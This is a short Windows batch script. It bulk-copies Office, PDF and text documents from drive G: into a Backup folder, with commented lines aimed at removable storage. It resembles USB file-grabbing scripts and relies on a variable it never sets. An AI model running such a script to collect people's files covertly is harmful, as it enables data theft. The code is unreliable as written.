
@echo off
cls
md %drive%\Backup
::copy  "E:\Moves\*.*" "%removablestorage%\Copy_All\" /Z /y /L
::copy "C:\Windows\System32\*.*" "%drive%\Copy_All\" /Z /Y /L
@echo on
:: variables SET 
SET odrive=%odrive:~0,2% 
set Backupcmd=xcopy /s /c /d /e /h /i /r /y 
echo on 
color 0a
%Backupcmd% "G:\*.xlsx" "%drive%\Backup\G\*.xlsx"
%Backupcmd% "G:\*.docx" "%drive%\Backup\G\*.docx"
%Backupcmd% "G:\*.doc" "%drive%\Backup\G\*.*"
%Backupcmd% "G:\*.pdf" "%drive%\Backup\G\*.*"
%Backupcmd% "G:\*.text" "%drive%\Backup\G\*.*"
%Backupcmd% "G:\*.txt" "%drive%\Backup\G\*.*"

exit